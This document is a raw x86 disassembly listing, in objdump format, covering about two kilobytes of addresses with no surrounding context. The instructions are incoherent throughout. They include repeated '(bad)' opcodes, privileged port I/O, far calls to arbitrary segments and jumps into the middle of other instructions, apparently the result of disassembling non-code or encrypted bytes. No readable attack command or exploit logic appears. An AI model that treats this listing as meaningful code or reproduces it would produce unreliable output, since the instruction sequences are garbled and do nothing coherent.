  420aec:	idiv   BYTE PTR cs:[edx]
  420aef:	mov    cl,0xe0
  420af1:	in     eax,dx
  420af2:	mov    eax,0xc8cfc988
  420af7:	or     al,0x1c
  420af9:	call   0x70c7:0xf2864aaa
  420b00:	jae    0x420a9d
  420b02:	and    bh,BYTE PTR [edx+0x4846649c]
  420b08:	xchg   DWORD PTR fs:[ebp-0x37],edx
  420b0c:	mov    edi,0x30dcc9ee
  420b11:	repz ja 0x420b19
  420b14:	fld    DWORD PTR [eax+0x4345102b]
  420b1a:	dec    ebp
  420b1b:	sbb    BYTE PTR [ebx+0x3c],bl
  420b1e:	arpl   WORD PTR [eax+0x4d],sp
  420b21:	fstp   TBYTE PTR [edx]
  420b23:	xchg   esi,eax
  420b24:	repz sbb eax,0x77a7aaad
  420b2a:	(bad)  
  420b2b:	cmc    
  420b2c:	cs pop ebp
  420b2e:	xchg   ecx,eax
  420b2f:	int    0xc
  420b31:	or     DWORD PTR [edi+esi*1+0x4896225d],ebx
  420b38:	inc    esp
  420b39:	in     al,dx
  420b3a:	cmp    eax,0xc7cfca3a
  420b3f:	mov    ebx,0xd2881ab3
  420b44:	push   ds
  420b45:	repz loop 0x420bae
  420b48:	mov    bh,0xf2
  420b4a:	lock mov edx,ebp
  420b4d:	jle    0x420ae3
  420b4f:	xchg   edi,eax
  420b50:	lea    edx,[ebx]
  420b52:	shr    DWORD PTR [edx+0x55],1
  420b55:	sbb    eax,0xfa9b3196
  420b5a:	into   
  420b5b:	xor    ch,bl
  420b5d:	pop    ecx
  420b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b5f:	sbb    al,0x24
  420b61:	or     eax,0x224c852a
  420b66:	add    BYTE PTR es:[ecx+0x597bc798],ch
  420b6d:	ror    BYTE PTR [ebp*1+0x6ee662cc],1
  420b74:	lock sar eax,1
  420b77:	inc    ebx
  420b78:	xor    edi,esp
  420b7a:	jmp    0x3da0:0x9cbb3b6c
  420b81:	pusha  
  420b82:	js     0x420b18
  420b84:	stc    
  420b85:	sub    dl,ah
  420b87:	lds    ebp,FWORD PTR [ebx]
  420b89:	out    0x93,al
  420b8b:	xlat   BYTE PTR ds:[ebx]
  420b8c:	cmp    edi,edi
  420b8e:	arpl   WORD PTR [ebp-0x1fe3e662],ax
  420b94:	sbb    al,0xb5
  420b96:	(bad)  
  420b97:	imul   edx,DWORD PTR [eax-0x73ed0db6],0x33
  420b9e:	push   esp
  420b9f:	adc    ebx,ebx
  420ba1:	test   eax,0x406e3bb2
  420ba6:	inc    esp
  420ba7:	dec    edx
  420ba8:	inc    esi
  420ba9:	mov    BYTE PTR [ecx+eax*2+0x7c],bh
  420bad:	mov    ecx,0x50a2c91c
  420bb2:	in     al,dx
  420bb3:	ja     0x420b93
  420bb5:	xor    ebp,DWORD PTR [edi-0x408c126a]
  420bbb:	imul   BYTE PTR [ebp-0x31a87eff]
  420bc1:	lods   al,BYTE PTR ds:[esi]
  420bc2:	stos   BYTE PTR es:[edi],al
  420bc3:	push   ebp
  420bc4:	xchg   edx,eax
  420bc5:	xchg   ecx,eax
  420bc6:	mov    ebp,0x5b34356
  420bcb:	add    bl,BYTE PTR [edx-0x4f75303c]
  420bd1:	mov    esi,0x8df3d09d
  420bd6:	shr    BYTE PTR [edx+0x2fe87ed9],0x1e
  420bdd:	jno    0x420c17
  420bdf:	loope  0x420b93
  420be1:	shl    DWORD PTR [esi-0x53],0xbb
  420be5:	cli    
  420be6:	inc    BYTE PTR ds:0x71e7338a
  420bec:	inc    edi
  420bed:	inc    edi
  420bee:	adc    eax,0x454cb47f
  420bf3:	sub    al,0x17
  420bf5:	mov    esp,0x559c26a3
  420bfa:	xchg   ebp,eax
  420bfb:	adc    BYTE PTR [ecx-0x7f07f91c],0xc3
  420c02:	mov    DWORD PTR [ecx],esi
  420c04:	fldcw  WORD PTR [eax]
  420c06:	shr    DWORD PTR [ebp+0x1c],1
  420c09:	test   ch,cl
  420c0b:	adc    eax,0x9b49c8b3
  420c10:	push   es
  420c11:	aam    0x98
  420c13:	sahf   
  420c14:	fsubr  QWORD PTR [ecx-0x4d7568e8]
  420c1a:	xor    edx,0xb57a824
  420c20:	(bad)  
  420c21:	leave  
  420c22:	inc    eax
  420c23:	pusha  
  420c24:	ins    BYTE PTR es:[edi],dx
  420c25:	push   cs
  420c26:	dec    ecx
  420c27:	dec    ecx
  420c28:	pusha  
  420c29:	in     eax,dx
  420c2a:	mov    esp,0x41c4b58
  420c2f:	ins    BYTE PTR es:[edi],dx
  420c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c31:	std    
  420c32:	jmp    0x81aa770e
  420c37:	xchg   esi,eax
  420c38:	cs or  al,0xce
  420c3b:	cmc    
  420c3c:	xor    dh,BYTE PTR [ebx-0x4a5441e7]
  420c42:	js     0x420be7
  420c44:	or     edi,DWORD PTR [edi+0x2c]
  420c47:	retf   0xcaa6
  420c4a:	enter  0xb14e,0x36
  420c4e:	cmp    ebp,ecx
  420c50:	out    0x35,eax
  420c52:	out    0x5c,eax
  420c54:	cwde   
  420c55:	out    0x32,eax
  420c57:	imul   edi,DWORD PTR [edx],0xc2750d0
  420c5d:	pusha  
  420c5e:	sbb    BYTE PTR [ebx+0x7a56cb75],ch
  420c64:	pushf  
  420c65:	dec    ebx
  420c66:	idiv   BYTE PTR [ecx]
  420c68:	jge    0x420bff
  420c6a:	mov    edx,0x58a89c4c
  420c6f:	sbb    DWORD PTR ds:0x48f0fbe0,esp
  420c75:	dec    ebp
  420c76:	stos   BYTE PTR es:[edi],al
  420c77:	inc    ebx
  420c78:	shr    BYTE PTR [edi+0x4a68dcc2],1
  420c7e:	add    ch,BYTE PTR [ecx-0x3b]
  420c81:	aad    0x71
  420c83:	(bad)  
  420c85:	sub    bl,cl
  420c87:	or     eax,0x1690b7fa
  420c8c:	mov    eax,0x580d84c5
  420c91:	push   edx
  420c92:	jo     0x420c76
  420c94:	std    
  420c95:	fcmovb st,st(1)
  420c97:	data16 stos BYTE PTR es:[edi],al
  420c99:	and    bh,bh
  420c9b:	(bad)  
  420c9c:	mov    dl,0x6b
  420c9e:	test   eax,0xeb040f26
  420ca3:	pop    edx
  420ca4:	push   eax
  420ca5:	inc    esi
  420ca6:	jmp    0x11e26b4f
  420cab:	cli    
  420cac:	xor    al,BYTE PTR [edx]
  420cae:	xchg   ebp,eax
  420caf:	sbb    ebp,DWORD PTR [eax]
  420cb1:	rcr    BYTE PTR [edx],cl
  420cb3:	std    
  420cb4:	jo     0x420c52
  420cb6:	xchg   edi,eax
  420cb7:	das    
  420cb8:	sar    BYTE PTR [edx],1
  420cba:	mov    dh,0xcd
  420cbc:	mov    eax,ecx
  420cbe:	or     BYTE PTR [ecx-0x3e4f4f09],0x2f
  420cc5:	fild   QWORD PTR [edi+0x36]
  420cc8:	add    ebp,DWORD PTR [esi+0x5d]
  420ccb:	cmp    al,BYTE PTR [edi]
  420ccd:	pop    esp
  420cce:	sub    eax,0x9896e109
  420cd3:	and    eax,0x870eeef9
  420cd8:	pop    ebp
  420cd9:	outs   dx,BYTE PTR ds:[esi]
  420cda:	jmp    0xbc4ead91
  420cdf:	addr16 mov ds:0xffb5,al
  420ce3:	test   al,0x9
  420ce5:	dec    ecx
  420ce6:	aas    
  420ce7:	retf   0x65de
  420cea:	test   DWORD PTR [ebp+0x28],edi
  420ced:	add    bh,BYTE PTR [edx]
  420cef:	data16 das 
  420cf1:	push   esi
  420cf2:	sub    ah,BYTE PTR ds:0x2ea76a43
  420cf8:	sub    al,0x5b
  420cfa:	aad    0x1d
  420cfc:	ret    0x4d31
  420cff:	pop    es
  420d00:	addr16 cmc 
  420d02:	out    dx,al
  420d03:	das    
  420d04:	rcr    BYTE PTR [esi],0x78
  420d07:	jbe    0x420d0d
  420d09:	icebp  
  420d0a:	mov    ebp,0xa49a5dca
  420d0f:	sbb    esi,DWORD PTR [ebx]
  420d11:	(bad)  
  420d12:	lods   al,BYTE PTR ds:[esi]
  420d13:	xchg   ecx,eax
  420d14:	lods   eax,DWORD PTR ds:[esi]
  420d15:	and    eax,0xec69e4ce
  420d1a:	adc    cl,0xda
  420d1d:	int    0x3c
  420d1f:	and    al,0xe0
  420d21:	xor    bh,BYTE PTR [ebx-0x49]
  420d24:	cmp    DWORD PTR [esi],ecx
  420d26:	mov    esi,0xa61cc246
  420d2b:	ret    
  420d2c:	popa   
  420d2d:	ret    0x4a5a
  420d30:	jae    0x420d0c
  420d32:	adc    DWORD PTR [esi+ebx*1],esi
  420d35:	cmp    DWORD PTR [eax+0x4d],esi
  420d38:	repz pushf 
  420d3a:	jl     0x420dad
  420d3c:	pop    ebp
  420d3d:	add    DWORD PTR [ebx-0x57],edx
  420d40:	das    
  420d41:	aam    0x7
  420d43:	int    0x64
  420d45:	arpl   WORD PTR [edi],dx
  420d47:	and    eax,DWORD PTR [ebp-0x46]
  420d4a:	xor    al,0x28
  420d4c:	(bad)  
  420d4d:	test   BYTE PTR ds:[ebx+0x37779f35],0x98
  420d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d56:	fistp  WORD PTR [eax]
  420d58:	daa    
  420d59:	faddp  st(0),st
  420d5b:	mov    edi,0xe6b1f8b1
  420d60:	stos   BYTE PTR es:[edi],al
  420d61:	addr16 jns 0x420d5d
  420d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d65:	mov    dl,0xe0
  420d67:	mov    BYTE PTR [edi-0x59],0xca
  420d6b:	inc    eax
  420d6c:	mov    dh,0xbb
  420d6e:	inc    edi
  420d6f:	or     DWORD PTR [ebx+0x550124ca],ebp
  420d75:	repz test DWORD PTR [ebx-0x3ce6a576],esp
  420d7c:	inc    eax
  420d7d:	jmp    0x2a11:0xaa04f057
  420d84:	cmp    ch,BYTE PTR [edx+0x6827c78b]
  420d8a:	and    eax,DWORD PTR [edi+ebx*4+0xb]
  420d8e:	or     cl,BYTE PTR [edx]
  420d90:	cdq    
  420d91:	push   cs
  420d92:	or     ebx,ebx
  420d94:	repnz cmp al,0xae
  420d97:	mov    al,0xdb
  420d99:	xlat   BYTE PTR ds:[ebx]
  420d9a:	sbb    ebx,DWORD PTR [ebp+0x7c]
  420d9d:	fsub   st(2),st
  420d9f:	sahf   
  420da0:	jae    0x420d42
  420da2:	repnz inc edx
  420da4:	sub    edi,0x38
  420da7:	xchg   edx,eax
  420da8:	out    dx,al
  420da9:	lds    esi,FWORD PTR [ebx+0x7d]
  420dac:	test   DWORD PTR [esi],0x8fc72d89
  420db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420db3:	outs   dx,BYTE PTR ds:[si]
  420db5:	leave  
  420db6:	cli    
  420db7:	inc    ebp
  420db8:	hlt    
  420db9:	pop    ecx
  420dba:	xchg   edi,eax
  420dbb:	repz fs rol ecx,1
  420dbf:	cmp    al,0x59
  420dc1:	mov    ebx,0xd189f780
  420dc6:	add    eax,0x82b73126
  420dcb:	cmp    eax,0x1fdf2127
  420dd0:	addr16 dec esp
  420dd2:	or     eax,0x92ac8d9
  420dd7:	and    edx,DWORD PTR [ebx]
  420dd9:	dec    ecx
  420dda:	adc    DWORD PTR [edi],edx
  420ddc:	loope  0x420d7a
  420dde:	lods   eax,DWORD PTR ds:[esi]
  420ddf:	cmc    
  420de0:	(bad)  
  420de1:	push   edx
  420de2:	lods   al,BYTE PTR ds:[esi]
  420de3:	out    dx,al
  420de4:	popa   
  420de5:	ficomp DWORD PTR [ecx+0x3b]
  420de8:	js     0x420d78
  420dea:	out    dx,eax
  420deb:	inc    ecx
  420dec:	(bad)  
  420ded:	mov    ah,0x2c
  420def:	lods   al,BYTE PTR ds:[esi]
  420df0:	inc    esp
  420df1:	pop    edi
  420df2:	rol    BYTE PTR [ebx],cl
  420df4:	pop    ds
  420df5:	int    0xfe
  420df7:	push   0x26
  420df9:	mov    al,0xda
  420dfb:	mov    ch,BYTE PTR [edx]
  420dfd:	push   ebp
  420dfe:	cmp    DWORD PTR [edi-0x15dd5ece],ecx
  420e04:	mov    dh,dl
  420e06:	push   ebx
  420e07:	push   ss
  420e08:	es call 0x641629e6
  420e0e:	jge    0x420de0
  420e10:	pop    ss
  420e11:	or     DWORD PTR [ebp+0x3b8d9c0],esi
  420e17:	pop    ebx
  420e18:	xchg   ecx,eax
  420e19:	fsub   QWORD PTR [edi-0x5e5dae1c]
  420e1f:	jbe    0x420de2
  420e21:	sub    DWORD PTR [ebx+0xb2246d1],0x98bfd009
  420e2b:	jae    0x420e28
  420e2d:	outs   dx,DWORD PTR ds:[esi]
  420e2e:	(bad)  
  420e2f:	mov    al,0x40
  420e31:	ret    
  420e32:	fmul   DWORD PTR [ecx-0x646c0343]
  420e38:	or     BYTE PTR [eax-0x72],al
  420e3b:	jno    0x420e9e
  420e3d:	popf   
  420e3e:	bound  esp,QWORD PTR [eax+0x13]
  420e41:	push   cs
  420e42:	xchg   edi,eax
  420e43:	sub    al,0x9c
  420e45:	inc    ecx
  420e46:	aaa    
  420e47:	dec    ebx
  420e48:	mov    bl,0x50
  420e4a:	call   0x43daaffa
  420e4f:	das    
  420e50:	lock push ecx
  420e52:	setg   al
  420e55:	or     ch,dl
  420e57:	enter  0xe4a4,0x14
  420e5b:	jb     0x420e8f
  420e5d:	dec    edi
  420e5e:	adc    al,0xc
  420e60:	xor    ebx,DWORD PTR [edx]
  420e62:	popf   
  420e63:	jo     0x420e12
  420e65:	sub    dh,BYTE PTR [ecx]
  420e67:	(bad)  
  420e68:	jnp    0x420df9
  420e6a:	popa   
  420e6b:	mov    DWORD PTR [edx],esp
  420e6d:	call   0xe592:0x768cc957
  420e74:	or     dh,al
  420e76:	dec    eax
  420e77:	mov    cl,0x77
  420e79:	mov    ch,0x98
  420e7b:	cwde   
  420e7c:	jbe    0x420e56
  420e7e:	mov    edx,0xda6fcc74
  420e83:	push   edx
  420e84:	aaa    
  420e85:	not    DWORD PTR [ebp-0x9]
  420e88:	ja     0x420e4f
  420e8a:	xchg   edi,eax
  420e8b:	out    0xb0,eax
  420e8d:	ins    BYTE PTR es:[edi],dx
  420e8e:	cmp    eax,0xde95c602
  420e93:	adc    ecx,DWORD PTR [edi]
  420e95:	ss lock loop 0x420e41
  420e99:	mov    edi,0xde9039a4
  420e9e:	int3   
  420e9f:	pop    esi
  420ea0:	mov    al,ds:0xe0d66fc2
  420ea5:	adc    DWORD PTR [edi],esp
  420ea7:	(bad)  
  420ea8:	cmc    
  420ea9:	repz addr16 jle 0x420e60
  420ead:	mov    ebp,esp
  420eaf:	into   
  420eb0:	add    DWORD PTR [eax+ebx*4],eax
  420eb3:	pushf  
  420eb4:	ds sub al,0xfd
  420eb7:	adc    eax,ecx
  420eb9:	sbb    al,al
  420ebb:	sar    bh,0x30
  420ebe:	mov    ebp,fs
  420ec0:	mov    eax,DWORD PTR [edx]
  420ec2:	push   esi
  420ec3:	mov    BYTE PTR [edx+edi*1],0x6a
  420ec7:	dec    edi
  420ec8:	lea    ebp,[edx-0x27]
  420ecb:	cdq    
  420ecc:	cmp    bh,BYTE PTR [edx]
  420ece:	jmp    0x8fa1:0x29054443
  420ed5:	in     al,0x3f
  420ed7:	iret   
  420ed8:	arpl   bp,bp
  420eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420edb:	push   esp
  420edc:	pop    ss
  420edd:	repnz push esp
  420edf:	add    BYTE PTR [ebp+0x63046f20],ch
  420ee5:	cmp    BYTE PTR [edi-0x12b22d1f],al
  420eeb:	mov    BYTE PTR [ebx+0x34],bl
  420eee:	inc    esp
  420eef:	xor    BYTE PTR [edi+eax*2],ah
  420ef2:	jnp    0x420e75
  420ef4:	sbb    BYTE PTR [edx],0xea
  420ef7:	xchg   ebp,eax
  420ef8:	ins    DWORD PTR es:[edi],dx
  420ef9:	jo     0x420f52
  420efb:	sbb    esp,DWORD PTR [ebx+0x60de7f28]
  420f01:	push   0xffffffe1
  420f03:	ja     0x420ef5
  420f05:	(bad)  
  420f06:	push   edi
  420f07:	les    eax,FWORD PTR ds:0xff586f2
  420f0d:	and    ecx,DWORD PTR [ebp-0x50a756ae]
  420f13:	outs   dx,BYTE PTR ds:[esi]
  420f14:	push   eax
  420f15:	cli    
  420f16:	popa   
  420f17:	bound  edx,QWORD PTR ds:0x8d34d10a
  420f1d:	punpckhwd mm3,QWORD PTR [ebp-0x2c]
  420f21:	add    ecx,DWORD PTR [ecx+0x72abab06]
  420f27:	xor    BYTE PTR [eax-0x58],ch
  420f2a:	jae    0x420f15
  420f2c:	xor    DWORD PTR [edx+0x35],ebp
  420f2f:	push   edi
  420f30:	lea    ebx,[edi]
  420f32:	test   al,0x5
  420f34:	mov    WORD PTR [ebx-0x6c7f0581],ds
  420f3a:	lea    ebx,[eax+edi*4+0x38aaca06]
  420f41:	enter  0x413b,0x6b
  420f45:	xor    esi,ebp
  420f47:	rol    DWORD PTR [ecx-0x1e],0x10
  420f4b:	mov    dl,0x66
  420f4d:	mov    dh,0xa0
  420f4f:	adc    eax,0xd7515735
  420f54:	jl     0x420fb5
  420f56:	pop    es
  420f57:	cmc    
  420f58:	mov    ebp,0x7961c2f2
  420f5d:	scas   eax,DWORD PTR es:[edi]
  420f5e:	cwde   
  420f5f:	xor    BYTE PTR [ebx],0x3d
  420f62:	rcl    DWORD PTR [eax+ecx*1],1
  420f65:	rol    BYTE PTR [edx],cl
  420f67:	mov    bl,0x85
  420f69:	pop    ds
  420f6a:	out    dx,al
  420f6b:	stos   DWORD PTR es:[edi],eax
  420f6c:	mov    ah,0xc8
  420f6e:	pushf  
  420f6f:	repnz pop eax
  420f71:	dec    edi
  420f72:	inc    edi
  420f73:	mov    esp,DWORD PTR [esi]
  420f75:	into   
  420f76:	mov    WORD PTR [ebp-0x53],cs
  420f79:	or     BYTE PTR [edi+0x2d],cl
  420f7c:	stc    
  420f7d:	les    edi,FWORD PTR [esi-0x63d23dd8]
  420f83:	clc    
  420f84:	sbb    eax,0x42349943
  420f89:	mov    eax,ds:0x3ab509f0
  420f8e:	stos   BYTE PTR es:[edi],al
  420f8f:	cwde   
  420f90:	push   edx
  420f91:	jb     0x421007
  420f93:	sti    
  420f94:	fstp   DWORD PTR [esi+0x3e]
  420f97:	jne    0x420f55
  420f99:	cmp    eax,0x7c61c771
  420f9e:	out    0x1d,al
  420fa0:	sbb    ebx,DWORD PTR [edi]
  420fa2:	daa    
  420fa3:	js     0x42100e
  420fa5:	mov    eax,0x54df86f3
  420faa:	push   esi
  420fab:	adc    ch,BYTE PTR [ebp+0x2aa2ffc4]
  420fb1:	cmp    eax,0x26050941
  420fb6:	adc    bl,BYTE PTR [ebx]
  420fb8:	icebp  
  420fb9:	sub    ebp,edx
  420fbb:	xchg   ecx,eax
  420fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fbd:	jp     0x420f84
  420fbf:	pop    ecx
  420fc0:	repnz and eax,ecx
  420fc3:	pop    esi
  420fc4:	rol    cl,1
  420fc6:	add    edx,DWORD PTR [esi-0x78d63896]
  420fcc:	mov    ebx,0xaad1ab87
  420fd1:	out    dx,eax
  420fd2:	(bad)
  420fd5:	xor    DWORD PTR [edi],edi
  420fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd8:	lea    eax,[esi-0x2e86057f]
  420fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fdf:	fs push ebp
  420fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fe2:	in     eax,0x59
  420fe4:	mov    eax,ds:0x96124386
  420fe9:	dec    edx
  420fea:	sub    DWORD PTR [edx],esi
  420fec:	outs   dx,DWORD PTR ds:[esi]
  420fed:	cmp    bh,al
  420fef:	mov    ecx,0x8414b7c
  420ff4:	into   
  420ff5:	fistp  WORD PTR [ecx-0x50]
  420ff8:	jo     0x420f9b
  420ffa:	push   ds
  420ffb:	std    
  420ffc:	xor    BYTE PTR ss:[ebx+eiz*4+0x190b344f],ah
  421004:	fiadd  DWORD PTR [esi+0x21ca9efa]
  42100a:	cdq    
  42100b:	push   0xf1846311
  421010:	in     al,0xb1
  421012:	or     edi,esi
  421014:	dec    ebp
  421015:	cmc    
  421016:	jno    0x420fa6
  421018:	loop   0x421044
  42101a:	idiv   BYTE PTR [eax]
  42101c:	rcl    DWORD PTR [esi-0x676d34e0],cl
  421022:	lock in al,dx
  421024:	test   DWORD PTR [esi-0x50f06da],eax
  42102a:	sbb    edi,DWORD PTR [esi+edi*4-0x54]
  42102e:	sub    ebp,edi
  421030:	push   ebx
  421031:	iret   
  421032:	test   al,0xef
  421034:	idiv   BYTE PTR [ebx+0x78d7e9b8]
  42103a:	rcl    cl,1
  42103c:	inc    eax
  42103d:	add    ebp,esp
  42103f:	test   al,0x86
  421041:	xchg   BYTE PTR [edi-0x5],al
  421044:	rol    DWORD PTR [ebp-0x199749b5],cl
  42104a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42104b:	ret    0x80d7
  42104e:	test   DWORD PTR [esi+ebp*2],0x55fe1a24
  421055:	push   ss
  421056:	pop    esi
  421057:	jge    0x421082
  421059:	ds inc esp
  42105b:	jle    0x4210a6
  42105d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42105e:	mov    cl,0x26
  421060:	out    0x19,eax
  421062:	je     0x4210ad
  421064:	popa   
  421065:	call   0x5ceb:0x726fc58e
  42106c:	lods   al,BYTE PTR ds:[esi]
  42106d:	fld    DWORD PTR [edi-0x1da84150]
  421073:	xchg   esi,eax
  421074:	loop   0x421028
  421076:	pushf  
  421077:	push   es
  421078:	xchg   edx,eax
  421079:	mov    ds:0xa2159ed2,al
  42107e:	cmp    BYTE PTR [ebx],ah
  421080:	mov    BYTE PTR [eax],0xa7
  421083:	dec    BYTE PTR [esi]
  421085:	inc    ebp
  421086:	iret   
  421087:	mov    edi,0x594635d8
  42108c:	inc    edi
  42108d:	stos   DWORD PTR es:[edi],eax
  42108e:	mov    al,0x63
  421090:	or     al,0x28
  421092:	test   eax,0x2ed65bc1
  421097:	push   ss
  421098:	in     al,dx
  421099:	fnstsw WORD PTR [edi+0x2b]
  42109c:	icebp  
  42109d:	test   BYTE PTR [ecx-0x4fc2a475],cl
  4210a3:	pop    ss
  4210a4:	repz xchg esp,eax
  4210a6:	popa   
  4210a7:	test   BYTE PTR ds:0x5ca8b07f,bh
  4210ad:	or     al,0x35
  4210af:	in     al,dx
  4210b0:	mov    ebx,0xe1df1707
  4210b5:	push   edi
  4210b6:	loopne 0x421067
  4210b8:	test   DWORD PTR [edi+esi*4+0x75],ebp
  4210bc:	(bad)  
  4210bd:	push   edx
  4210be:	(bad)  
  4210bf:	xlat   BYTE PTR ds:[ebx]
  4210c0:	inc    eax
  4210c1:	daa    
  4210c2:	mov    ah,BYTE PTR [ebx+0x315e9c87]
  4210c8:	pop    edi
  4210c9:	adc    eax,0x542ef87c
  4210ce:	fwait
  4210cf:	mov    eax,0xc0ca49fc
  4210d4:	push   ds
  4210d5:	(bad)
  4210d8:	outs   dx,BYTE PTR ds:[esi]
  4210d9:	or     BYTE PTR ds:0xc929584f,bl
  4210df:	stc    
  4210e0:	repnz adc al,0x0
  4210e3:	jne    0x421120
  4210e5:	mov    bl,BYTE PTR [edx+edi*4-0x19]
  4210e9:	mov    esp,0xa53c6198
  4210ee:	inc    edi
  4210ef:	xchg   esp,eax
  4210f0:	jb     0x42116b
  4210f2:	call   0xd3ce:0xf6467b12
  4210f9:	mov    cl,0xa7
  4210fb:	arpl   ax,bx
  4210fd:	and    esp,DWORD PTR [edi+0x7e]
  421100:	sbb    al,0x17
  421102:	int    0xc8
  421104:	daa    
  421105:	push   edx
  421107:	test   BYTE PTR [edi-0x30],0xd3
  42110b:	fwait
  42110c:	call   0x75843926
  421111:	(bad)  
  421112:	out    dx,al
  421113:	mov    ecx,0x59ef6db3
  421118:	push   edx
  421119:	pushf  
  42111a:	imul   esp,DWORD PTR [esi],0xffffff83
  42111d:	pop    edi
  42111e:	loopne 0x4210ea
  421120:	div    DWORD PTR [edi+0x65]
  421123:	push   eax
  421124:	in     eax,dx
  421125:	pop    edx
  421126:	arpl   WORD PTR [ebx],ax
  421128:	stos   BYTE PTR es:[edi],al
  421129:	cmp    ebx,DWORD PTR [ebp-0x21]
  42112c:	addr16 das 
  42112e:	js     0x42110b
  421130:	xor    DWORD PTR [ebx],esp
  421132:	push   esi
  421133:	sub    bh,0xec
  421136:	mov    eax,0x5aa9966f
  42113b:	(bad)  
  42113c:	iret   
  42113d:	cld    
  42113e:	mov    al,ds:0xcca88b88
  421143:	inc    ebx
  421144:	not    al
  421146:	sbb    eax,0x91ae4018
  42114b:	push   edx
  42114c:	xchg   BYTE PTR [esi+eiz*8-0x19],cl
  421150:	inc    ebp
  421151:	xor    al,0x6
  421153:	inc    edi
  421154:	rcl    DWORD PTR [ebx],cl
  421156:	jae    0x4211c0
  421158:	and    dh,al
  42115a:	xchg   edx,eax
  42115b:	retf   
  42115c:	mov    esp,0x2497acda
  421161:	xor    DWORD PTR [ebp+0x7df927c1],ecx
  421167:	jo     0x4210e9
  421169:	retf   0x3b2f
  42116c:	push   ebx
  42116d:	(bad)  
  42116e:	mul    DWORD PTR [ecx+0x5f]
  421171:	leave  
  421172:	(bad)  
  421173:	mov    bh,0x80
  421175:	(bad)  
  421176:	(bad)  
  421177:	outs   dx,DWORD PTR ds:[esi]
  421178:	lock fiadd WORD PTR [edx]
  42117b:	mov    bl,0x65
  42117d:	loopne 0x4211e1
  42117f:	int    0x9c
  421181:	xchg   ebp,eax
  421182:	or     al,0xd6
  421184:	push   ss
  421185:	jnp    0x42119c
  421187:	pop    DWORD PTR ds:0x79ef8643
  42118d:	into   
  42118e:	imul   edx,esp,0xcd05b454
  421194:	inc    eax
  421195:	xor    al,0xf7
  421197:	lahf   
  421198:	std    
  421199:	js     0x42114a
  42119b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42119c:	xor    al,0x2f
  42119e:	jne    0x42119c
  4211a0:	dec    esi
  4211a1:	(bad)  
  4211a2:	xchg   ebp,eax
  4211a3:	adc    ebx,DWORD PTR [edi*2+0x7483e5f9]
  4211aa:	sbb    dh,BYTE PTR [edx-0x1234a469]
  4211b0:	xchg   esp,eax
  4211b1:	jns    0x4211a8
  4211b3:	xchg   esi,eax
  4211b4:	mov    DWORD PTR [eax],esi
  4211b6:	and    ebp,DWORD PTR [ebx-0x2c185934]
  4211bc:	lea    edx,[eax]
  4211be:	mov    BYTE PTR [ecx],dh
  4211c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c1:	in     al,dx
  4211c2:	cmp    ah,bh
  4211c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211c5:	dec    ebx
  4211c6:	rol    DWORD PTR [esi-0x2],cl
  4211c9:	inc    ebx
  4211ca:	xlat   BYTE PTR ds:[ebx]
  4211cb:	jnp    0x421159
  4211cd:	sbb    al,0x15
  4211cf:	aad    0xcf
  4211d1:	push   eax
  4211d2:	addr16 adc al,0x8b
  4211d5:	jl     0x4211e0
  4211d7:	xchg   esp,eax
  4211d8:	ja     0x4211d4
  4211da:	xchg   ecx,eax
  4211db:	mov    ss,WORD PTR [ebp+ebx*2-0x37fe7c57]
  4211e2:	push   ds
  4211e3:	aas    
  4211e4:	dec    eax
  4211e5:	mov    DWORD PTR [edi-0x1ca01f92],edi
  4211eb:	arpl   ax,dx
  4211ed:	lds    esp,FWORD PTR [ebp-0x677a380b]
  4211f3:	cmp    BYTE PTR [eax],bh
  4211f5:	mov    ebp,0xa5f1a347
  4211fa:	ret    0x7910
  4211fd:	sub    al,0x5b
  4211ff:	xor    edi,DWORD PTR [ecx-0x7e593bea]
  421205:	mov    BYTE PTR [ebp+0x78],dl
  421208:	stos   DWORD PTR es:[edi],eax
  421209:	(bad)  
  42120a:	lea    edi,[ebp-0x3a65a84b]
  421210:	pop    ss
  421211:	add    ah,BYTE PTR [esi+eiz*4+0x24bc0ab0]
  421218:	ins    DWORD PTR es:[edi],dx
  421219:	jne    0x421279
  42121b:	sahf   
  42121c:	clc    
  42121d:	pop    ebx
  42121e:	mov    eax,DWORD PTR [ecx+0xd7d447b]
  421224:	or     al,0xe6
  421226:	in     al,dx
  421227:	fadd   QWORD PTR [edi-0x1a]
  42122a:	push   ss
  42122b:	js     0x421281
  42122d:	fnsave [esi]
  42122f:	movzx  edx,BYTE PTR [eax+ebx*1]
  421233:	inc    esi
  421234:	shr    BYTE PTR [esi-0x5663ac03],cl
  42123a:	and    BYTE PTR [esp+edi*4-0x1e88bea],0xc4
  421242:	mov    ds,ebp
  421244:	xchg   ebx,eax
  421245:	(bad)  
  421246:	repz sbb BYTE PTR [eax],0x4b
  42124a:	dec    eax
  42124b:	push   ebx
  42124c:	icebp  
  42124d:	rcl    DWORD PTR [ecx+0x1993e927],0xec
  421254:	call   0xcb2e:0xb33c811e
  42125b:	xor    al,0x45
  42125d:	stos   BYTE PTR es:[edi],al
  42125e:	pushf  
  42125f:	out    0x3b,al
  421261:	mov    bl,bl
  421263:	mov    eax,0x446f5605
  421268:	xchg   ebp,ecx
  42126a:	mov    ebx,0xe67f78c2
  42126f:	dec    edx
  421270:	pusha  
  421271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421272:	push   ebx
  421273:	inc    ecx
  421274:	cmp    al,0x49
  421276:	mov    DWORD PTR [esp+ebx*2],eax
  421279:	lods   eax,DWORD PTR ds:[esi]
  42127a:	or     eax,0x23693bf8
  42127f:	aam    0xc1
  421281:	and    al,0xb7
  421283:	test   DWORD PTR [ecx-0x4b5640be],ecx
  421289:	mov    edx,ecx
